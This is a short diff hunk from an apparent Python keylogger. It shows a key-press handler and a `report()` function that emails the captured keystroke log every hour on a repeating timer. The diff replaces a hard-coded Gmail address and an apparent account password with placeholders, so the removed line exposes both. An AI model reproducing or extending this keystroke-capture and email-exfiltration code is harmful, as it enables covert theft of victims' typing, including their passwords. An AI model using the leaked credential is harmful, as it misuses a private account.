@@ -23,7 +23,7 @@ def process_key_press(key):
 
 def report():
 	global log
-	send_mail("meherpranav5@gmail.com", "dontaskagain", log)
+	send_mail("<Email>", "Password", log)
 	log = ""
 	timer = threading.Timer(3600, report)
 	timer.start()
